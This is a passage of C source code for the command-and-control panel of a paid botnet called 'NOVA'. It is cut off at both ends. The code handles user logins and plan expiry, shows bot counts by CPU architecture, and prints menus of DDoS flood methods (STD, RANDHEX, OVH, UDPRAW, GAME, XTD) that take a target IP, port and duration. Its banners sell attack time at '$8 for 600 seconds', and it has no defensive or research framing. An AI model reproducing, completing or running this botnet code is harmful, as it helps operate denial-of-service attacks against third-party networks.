				sprintf(usethis, ""Y"You Didnt Accept TOS Therefore you can not use our services\r\n");
				if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
				sleep(5);
				memset(nickstring, 0, sizeof(nickstring));
				goto end;
			}

            }
        }

            failed:
			if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
			sprintf(usethis, ""Y"You Have Failed Your Login Please Try Again...\r\n");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
        	goto end;

        Banner:

        strcpy(accounts[datafd].expirydate, accounts[find_line].expirydate);
        if(check_expiry(datafd) == 1)
        {
            sprintf(clearscreen, "\033[2J\033[1;1H");    
            if(send(datafd, clearscreen,  strlen(clearscreen),    MSG_NOSIGNAL) == -1) goto end;
            send(datafd, ""Y"Account Has Expired, Message Admin For Renewal!\r\n", strlen(""Y"Account Has Expired, Message Admin For Renewal!\r\n"), MSG_NOSIGNAL); // now
            sleep(5);
            goto end;
        }
        gay[datafd].login = 0;
		pthread_create(&title, NULL, &TitleWriter, sock);
		         
		  char Nova_banner0   [5000];
          char Nova_banner1   [5000];
          char Nova_banner2   [5000];
          char Nova_banner3   [5000];
          char Nova_banner4   [5000];
          char Nova_banner5   [5000];
          char Nova_banner6   [5000];
          char Nova_banner7   [5000];
          char Nova_banner8   [5000];
          char Nova_banner9   [5000];
          char Nova_bannera   [5000];
          char Nova_bannerb   [5000];
          char Nova_bannerc   [5000];
          char Nova_bannerd   [5000];
          char Nova_bannere   [5000];
          char Nova_bannerf   [5000];
     	  char *userlog  [800];

 char hostbuffer[256]; 
    int hostname; 
    hostname = gethostname(hostbuffer, sizeof(hostbuffer)); 
    checkHostName(hostname); 
 				if(!strcmp(accounts[find_line].admin, "admin")) 
 				{
 					managements[datafd].adminstatus = 1;
 				}

                char clearscreen1 [2048];
				memset(clearscreen1, 0, 2048);
				sprintf(clearscreen1, "\033[2J\033[1;1H");	
				sprintf(managements[datafd].my_ip, "%s", ipinfo);
				sprintf(managements[datafd].id, "%s", accounts[find_line].username);
				sprintf(managements[datafd].planname, "%s", accounts[find_line].admin);
				managements[datafd].mycooldown = accounts[find_line].cooldown;
				managements[datafd].mymaxtime = accounts[find_line].maxtime;

				int loginshit;
				for(loginshit=0;loginshit<MAXFDS;loginshit++)
				{
					if(gay[datafd].just_logged_in == 0 && managements[loginshit].LoginListen == 1 && managements[loginshit].connected == 1 && loggedin == 0)
					{
						sprintf(usethis, "\r\n%s Plan: [%s] Just Logged In!\r\n", managements[datafd].id, managements[datafd].planname);
						if(send(loginshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						sprintf(usethis, "\r\n"P"ðŸ’”"E"%s"W"@"E"NOVA"P"ðŸ’”"W":", managements[loginshit].id);
						if(send(loginshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						gay[datafd].just_logged_in = 3;
					}
				}

        main_banner:;


				memset(ipinfo, 0, sizeof(ipinfo));			
				if(motdaction == 1)

				sprintf(Nova_banner0,  "\e[38;5;54mMOTD:\e[38;5;2m %s\r\n", motd); 
				sprintf(Nova_banner1,  "\033[2J\033[1;1H");
                sprintf(Nova_banner2,  "\r\n");
                sprintf(Nova_banner3,  "  "E" *   .   Â·â€¢ .   .  *    *  * "W"â•”â•â•â•â•â•â•â•"P"â•â•â•â•â•â•â•—"E" *   .   Â·â€¢ .   .  *    *  * *\r\n");
                sprintf(Nova_banner4,  "  "E" .     .* â–ª  *   .   *   *   "W"â•‘â•”â•—â•”â•”â•â•—â•¦"P"  â•¦â•”â•â•—â•‘"E" .     .* â–ª  *   .   *   * .\r\n");  
                sprintf(Nova_banner5,  "  "E"   *    Â·â€¢   *  *   .   .    "W"â•‘â•‘â•‘â•‘â•‘ â•‘â•š"P"â•—â•”â•â• â•â•£â•‘"E"   *    Â·â€¢   *  *   .   .     *\r\n");
                sprintf(Nova_banner6,  "  "E"*Â·â€¢  â–ª*â€¢   â–ªÂ·â€¢ *  .     .    "W"â•‘â•â•šâ•â•šâ•â• "P"â•šâ• â•© â•©â•‘"E" *Â·â€¢  â–ª*â€¢   â–ªÂ·â€¢ *  .     .  *Â·â€¢\r\n");
                sprintf(Nova_banner7,  "  "W"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•       "P"      â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\r\n");
                sprintf(Nova_banner8,  "  "W"â•‘                   HELP to see all a"P"vailable commands                  â•‘\r\n");
                sprintf(Nova_banner9,  "  "W"â•‘           \x1b[1;97mAnatku"W" made this sourc"P"e with \x1b[1;97m@Maverickslams"P"                 â•‘\r\n");
                sprintf(Nova_bannera,  "  "W"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•¦â•â•â•â•â•â•â•â•â•â•â•¦â•â•â•â•â•â•â•â•â•â•â•â•"P"â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•¦â•â•â•â•â•â•â•â•â•â•â•â•¦â•â•â•â•â•â•â•â•â•\r\n");
                sprintf(Nova_bannerb,  "  "W"             â•‘          â•‘ Thanks For "P"Buying Enjoy! â•‘           â•‘\r\n");      
                sprintf(Nova_bannerc,  "  "W"             â•‘     â•”â•â•â•â•â•©â•â•â•â•â•â•â•â•â•â•â•â•"P"â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•©â•â•â•â•â•â•—     â•‘\r\n");
                sprintf(Nova_bannerd,  "  "W"             â•šâ•â•â•â•â•â•‘$8 FOR 600 SECOND"P"S ADDED TO YOUR PLANâ•‘â•â•â•â•â•â•\r\n");
                sprintf(Nova_bannere,  "  "W"                   â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"P"â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\r\n");
                sprintf(Nova_bannerf,  "\r\n");					
				if(strlen(motd) > 1){
				if(send(datafd, Nova_banner0,  strlen(Nova_banner0),	MSG_NOSIGNAL) == -1) goto end;
				}
				if(send(datafd, Nova_banner1,  strlen(Nova_banner1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner2,  strlen(Nova_banner2),	MSG_NOSIGNAL) == -1) goto end; 
				if(send(datafd, Nova_banner3,  strlen(Nova_banner3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner4,  strlen(Nova_banner4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner5,  strlen(Nova_banner5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner6,  strlen(Nova_banner6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner7,  strlen(Nova_banner7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner8,  strlen(Nova_banner8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner9,  strlen(Nova_banner9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannera,  strlen(Nova_bannera),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerb,  strlen(Nova_bannerb),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerc,  strlen(Nova_bannerc),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerd,  strlen(Nova_bannerd),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannere,  strlen(Nova_bannere),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerf,  strlen(Nova_bannerf),	MSG_NOSIGNAL) == -1) goto end;
           
		while(1) {
		char input [5000];
        sprintf(input, "\r\n"P"ðŸ’”"E"%s"W"@"E"NOVA"P"ðŸ’”"W":", managements[datafd].id);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, sock);
        managements[datafd].connected = 1;

		while(fdgets(buf, sizeof buf, datafd) > 0) {   

      if(strcasestr(buf, "help") || strcasestr(buf, "info")) {
				pthread_create(&title, NULL, &TitleWriter, sock);
	  send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);			
				if(send(datafd, Nova_banner1,  strlen(Nova_banner1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner2,  strlen(Nova_banner2),	MSG_NOSIGNAL) == -1) goto end; 
				if(send(datafd, Nova_banner3,  strlen(Nova_banner3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner4,  strlen(Nova_banner4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner5,  strlen(Nova_banner5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner6,  strlen(Nova_banner6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner7,  strlen(Nova_banner7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner8,  strlen(Nova_banner8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner9,  strlen(Nova_banner9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannera,  strlen(Nova_bannera),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerb,  strlen(Nova_bannerb),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerc,  strlen(Nova_bannerc),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerd,  strlen(Nova_bannerd),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannere,  strlen(Nova_bannere),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerf,  strlen(Nova_bannerf),	MSG_NOSIGNAL) == -1) goto end;

                char help0  [800];
				char help1  [800];
				char help2  [800];
				char help3  [800];
				char help4  [800];
				char help5  [800];
				char help6  [800];
				char help7  [800];
				char help8  [800];
				char help9  [800];
				char help10  [800];
				char help11  [800];
				char help12  [800];
				char help13  [800];
				
				sprintf(help0,   "\r\n");
				sprintf(help1,   "\t\t"P"â•”"W"=========================================="P"â•—\r\n");
                sprintf(help2,   "\t\t"P"|"W"â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"P"|\r\n");             
				sprintf(help3,   "\t\t"P"|                                          "P"|\r\n");             
				sprintf(help4,   "\t\t"P"|    "E"Methods    "R"..."E"Shows Methods           "P"|\r\n");             
    		    sprintf(help5,   "\t\t"P"|    "E"Bots       "R"..."E"Shows Bot Count         "P"|\r\n");             
    		    sprintf(help6,   "\t\t"P"|    "E"Extra      "R"..."E"Shows Extra Commands    "P"|\r\n");             
    		    sprintf(help7,   "\t\t"P"|    "E"Admin      "R"..."E"Admin commands          "P"|\r\n");             
    		    sprintf(help8,   "\t\t"P"|    "E"Plans      "R"..."E"Shows Plans             "P"|\r\n");             
                sprintf(help9,   "\t\t"P"|    "E"Cls        "R"..."E"Clears Screen           "P"|\r\n");             
                sprintf(help10,  "\t\t"P"|    "E"STOP       "R"..."E"STOPS ATTACKS           "P"|\r\n");             
                sprintf(help11,  "\t\t"P"|                                          "P"|\r\n");             
                sprintf(help12,  "\t\t"P"â•š"W"=========================================="P"â•\r\n");

                if(send(datafd, help0,  strlen(help0),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help1,  strlen(help1),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help2,  strlen(help2),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help3,  strlen(help3),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help4,  strlen(help4),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help5,  strlen(help5),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help6,  strlen(help6),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help7,  strlen(help7),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help8,  strlen(help8),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help9,  strlen(help9),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help10,  strlen(help10),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help11,  strlen(help11),  MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, help12,  strlen(help12),  MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\r\n"P"ðŸ’”"E"%s"W"@"E"NOVA"P"ðŸ’”"W":", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto Banner;
				continue;
 		}


 		if(strcasestr(buf, "method"))
 		 {
			pthread_create(&title, NULL, &TitleWriter, sock);
	        send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);			
				if(send(datafd, Nova_banner1,  strlen(Nova_banner1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner2,  strlen(Nova_banner2),	MSG_NOSIGNAL) == -1) goto end; 
				if(send(datafd, Nova_banner3,  strlen(Nova_banner3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner4,  strlen(Nova_banner4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner5,  strlen(Nova_banner5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner6,  strlen(Nova_banner6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner7,  strlen(Nova_banner7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner8,  strlen(Nova_banner8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner9,  strlen(Nova_banner9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannera,  strlen(Nova_bannera),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerb,  strlen(Nova_bannerb),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerc,  strlen(Nova_bannerc),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerd,  strlen(Nova_bannerd),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannere,  strlen(Nova_bannere),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerf,  strlen(Nova_bannerf),	MSG_NOSIGNAL) == -1) goto end;
	  
	  		char attack0  [800];
			char attack1  [800];
			char attack2  [800];
			char attack3  [800];
			char attack4  [800];
			char attack5  [800];
			char attack6  [800];
			char attack7  [800];
			char attack8  [800];
			char attack9  [800];
			char attack10 [800];
			char attack11 [800];
			char attack12 [800];
			char disabled1[800];
			char disabled2[800];
			char disabled3[800];
			
			sprintf(attack0,   "\r\n");
            sprintf(attack1,   "\t\t"P"â•”"W"==================================================="P"â•—\r\n"); 
			sprintf(attack2,   "\t\t"P"|"W"â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"P"|\r\n");
			sprintf(attack3,   "\t\t"P"|                                                   |\r\n");
			sprintf(attack4,   "\t\t"P"|   "E"!* STD IP PORT TIME       "R"Custom STDHEX         "P"|\r\n");
			sprintf(attack5,   "\t\t"P"|   "E"!* RANDHEX IP PORT TIME   "R"Random HEX String     "P"|\r\n");
			sprintf(attack6,   "\t\t"P"|   "E"!* OVH IP PORT TIME 1024  "R"L7 HEX Flood          "P"|\r\n");
			sprintf(attack7,   "\t\t"P"|   "E"!* UDPRAW IP PORT TIME    "R"Raw UDPHEX Flood      "P"|\r\n");  
            sprintf(attack8,   "\t\t"P"|   "E"!* GAME IP PORT TIME      "R"VSEHEX Flood          "P"|\r\n");
            sprintf(attack9,   "\t\t"P"|   "E"!* XTD IP PORT TIME       "R"Custom STDHEX Flood   "P"|\r\n");
            sprintf(attack10,  "\t\t"P"|                                                   |\r\n");
            sprintf(attack11,  "\t\t"P"â•š"W"==================================================="P"â•\r\n");
            sprintf(attack12,  "\t\t\r\n"); 
            sprintf(disabled1, "\t\t"P"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—  \r\n");
            sprintf(disabled2, "\t\t"P"â•‘ "W"Attacks Are Currently Disabled Please Try Later. "P"â•‘  \r\n");
            sprintf(disabled3, "\t\t"P"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•  \r\n");

	  		if(AttackStatus == 0)
	  		{
                if(send(datafd, attack0,  strlen(attack0),	MSG_NOSIGNAL) == -1) goto end;               
				if(send(datafd, attack1,  strlen(attack1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack2,  strlen(attack2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack3,  strlen(attack3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack4,  strlen(attack4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack5,  strlen(attack5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack6,  strlen(attack6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack7,  strlen(attack7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack8,  strlen(attack8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack9,  strlen(attack9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack10,  strlen(attack10),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack11,  strlen(attack11),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, attack12,  strlen(attack12),	MSG_NOSIGNAL) == -1) goto end;
	  		} else {
	  			if(send(datafd, disabled1, strlen(disabled1), MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, disabled2, strlen(disabled2), MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, disabled3, strlen(disabled3), MSG_NOSIGNAL) == -1) goto end;
	  		}


				pthread_create(&title, NULL, &TitleWriter, sock);


		}

		if (strcasestr(buf, "bots") || strcasestr(buf, "count")) {
            char synpur1[128];
            char synpur2[128];
            char synpur3[128];
            char synpur4[128];
            char synpur5[128];
            char synpur6[128];
            char synpur7[128];
            char synpur8[128];

	  send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);			
				if(send(datafd, Nova_banner1,  strlen(Nova_banner1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner2,  strlen(Nova_banner2),	MSG_NOSIGNAL) == -1) goto end; 
				if(send(datafd, Nova_banner3,  strlen(Nova_banner3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner4,  strlen(Nova_banner4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner5,  strlen(Nova_banner5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner6,  strlen(Nova_banner6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner7,  strlen(Nova_banner7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner8,  strlen(Nova_banner8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner9,  strlen(Nova_banner9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannera,  strlen(Nova_bannera),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerb,  strlen(Nova_bannerb),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerc,  strlen(Nova_bannerc),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerd,  strlen(Nova_bannerd),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannere,  strlen(Nova_bannere),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerf,  strlen(Nova_bannerf),	MSG_NOSIGNAL) == -1) goto end;
	  sprintf(synpur8, "\e[35;8;126mCount: [\e[92m%d\e[35;8;126m] \r\n",  botsconnect());
      if(send(datafd, synpur8, strlen(synpur8), MSG_NOSIGNAL) == -1) goto end;

            if(x86Connected() != 0)// should i add u in this call ye
            {
                sprintf(synpur1,""W"x86: ["P"%d"W"] \r\n",     x86Connected());
                if(send(datafd, synpur1, strlen(synpur1), MSG_NOSIGNAL) == -1) goto end;
            }
            if(armConnected() != 0)
            {
                sprintf(synpur2,""W"Arm: ["P"%d"W"] \r\n",     armConnected());
                if(send(datafd, synpur2, strlen(synpur2), MSG_NOSIGNAL) == -1) goto end;
            }
            if(mipsConnected() != 0)
            {
                sprintf(synpur3,""W"Mips: ["P"%d"W"] \r\n",     mipsConnected());
                if(send(datafd, synpur3, strlen(synpur3), MSG_NOSIGNAL) == -1) goto end;
            }
            if(mpslConnected() != 0)
            {
                sprintf(synpur4,""W"Mpsl: ["P"%d"W"] \r\n",     mpslConnected());
                if(send(datafd, synpur4, strlen(synpur4), MSG_NOSIGNAL) == -1) goto end;
            }
            if(ppcConnected() != 0)
            {
                sprintf(synpur5,""W"Ppc: ["P"%d"W"] \r\n",     ppcConnected());
                if(send(datafd, synpur5, strlen(synpur5), MSG_NOSIGNAL) == -1) goto end;
            }
            if(spcConnected() != 0)
            {
                sprintf(synpur6,""W"Spc: ["P"%d"W"] \r\n",     spcConnected());
                if(send(datafd, synpur6, strlen(synpur6), MSG_NOSIGNAL) == -1) goto end;
            }
            if(unknownConnected() != 0)
            {
                sprintf(synpur7,""W"Unknown: ["P"%d"W"] \r\n",     unknownConnected());
                if(send(datafd, synpur7, strlen(synpur7), MSG_NOSIGNAL) == -1) goto end;
            }

            
			pthread_create(&title, NULL, &TitleWriter, sock);
		
			}


 			if(strcasestr(buf, "extra"))
 			{
 	  send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);			
				if(send(datafd, Nova_banner1,  strlen(Nova_banner1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner2,  strlen(Nova_banner2),	MSG_NOSIGNAL) == -1) goto end; 
				if(send(datafd, Nova_banner3,  strlen(Nova_banner3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner4,  strlen(Nova_banner4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner5,  strlen(Nova_banner5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner6,  strlen(Nova_banner6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner7,  strlen(Nova_banner7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner8,  strlen(Nova_banner8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner9,  strlen(Nova_banner9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannera,  strlen(Nova_bannera),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerb,  strlen(Nova_bannerb),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerc,  strlen(Nova_bannerc),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerd,  strlen(Nova_bannerd),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannere,  strlen(Nova_bannere),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerf,  strlen(Nova_bannerf),	MSG_NOSIGNAL) == -1) goto end;

 				char extra1[1000];
 				char extra2[1000];
 				char extra3[1000];
 				char extra4[1000];
 				char extra5[1000];
 				char extra6[1000];
 				char extra7[1000];
 				char extra8[1000];
 				char extra9[1000];
 				char extra10[1000];
 				char extra11[1000];
 				char extra12[1000];

                sprintf(extra1,   "\r\n");
 				sprintf(extra2,   "\t\t"P"â•”"W"======================================"P"â•—\r\n");    
 				sprintf(extra3,   "\t\t"P"|"W"â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•|\r\n");    
 				sprintf(extra4,   "\t\t"P"|                                      "P"|\r\n");    
 				sprintf(extra5,   "\t\t"P"|   "E"Msg       "R"..."E"Message Other Users   "P"|\r\n");    
 				sprintf(extra6,   "\t\t"P"|   "E"America   "R"..."E"Shows 'Murica         "P"|\r\n");
 				sprintf(extra7,   "\t\t"P"|   "E"Netflix   "R"..."E"Shows Netflix         "P"|\r\n");
 				sprintf(extra8,   "\t\t"P"|   "E"Weed      "R"..."E"Shows Weed            "P"|\r\n");    
                sprintf(extra9,   "\t\t"P"|   "E"Toggle1   "R"..."E"Toggles Messaging     "P"|\r\n");    
                sprintf(extra10,  "\t\t"P"|   "E"Toggle2   "R"..."E"Toggles Broadcast     "P"|\r\n");    
                sprintf(extra11,  "\t\t"P"|                                      "P"|\r\n");    
 				sprintf(extra12,  "\t\t"P"â•š"W"======================================"P"â•\r\n");    

 				if(send(datafd, extra1, strlen(extra1), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, extra2, strlen(extra2), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, extra3, strlen(extra3), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, extra4, strlen(extra4), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, extra5, strlen(extra5), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, extra6, strlen(extra6), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, extra7, strlen(extra7), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, extra8, strlen(extra8), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, extra9, strlen(extra9), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, extra10, strlen(extra10), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, extra11, strlen(extra11), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, extra12, strlen(extra12), MSG_NOSIGNAL) == -1) goto end;
 			}

 		      if(strcasestr(buf, "admin"))
 		      	{
					if(!strcasecmp(accounts[find_line].admin, "admin"))
					{
						pthread_create(&title, NULL, &TitleWriter, sock);
	  send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);			
				if(send(datafd, Nova_banner1,  strlen(Nova_banner1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner2,  strlen(Nova_banner2),	MSG_NOSIGNAL) == -1) goto end; 
				if(send(datafd, Nova_banner3,  strlen(Nova_banner3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner4,  strlen(Nova_banner4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner5,  strlen(Nova_banner5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner6,  strlen(Nova_banner6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner7,  strlen(Nova_banner7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner8,  strlen(Nova_banner8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner9,  strlen(Nova_banner9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannera,  strlen(Nova_bannera),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerb,  strlen(Nova_bannerb),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerc,  strlen(Nova_bannerc),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerd,  strlen(Nova_bannerd),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannere,  strlen(Nova_bannere),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerf,  strlen(Nova_bannerf),	MSG_NOSIGNAL) == -1) goto end;

						char admin1  [800];
						char admin2  [800];
						char admin3  [800];
						char admin4  [800];
						char admin5  [800];
						char admin6  [800];
						char admin7  [800];
						char admin8  [800];
						char admin9  [800];
						char admin10 [800];

						sprintf(admin1,  "\t\t"P"â•”"W"================================================"P"â•—\r\n");             
						sprintf(admin2,  "\t\t"P"|"W"â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"P"|\r\n");             
						sprintf(admin3,  "\t\t"P"|                                                "P"|\r\n");             
						sprintf(admin4,  "\t\t"P"|   "E"User            "R"..."E"Shows All User Commands   "P"|\r\n");             
						sprintf(admin5,  "\t\t"P"|   "E"Broadcast       "R"..."E"Broadcasts A Message      "P"|\r\n");             
						sprintf(admin6,  "\t\t"P"|   "E"Togglelisten    "R"..."E"Shows Sent Attacks        "P"|\r\n");             
						sprintf(admin7,  "\t\t"P"|   "E"ToggleAttacks   "R"..."E"Disables Attacks          "P"|\r\n");             
						sprintf(admin8,  "\t\t"P"|   "E"Togglelogin     "R"..."E"Shows Incoming Logins     "P"|\r\n");             
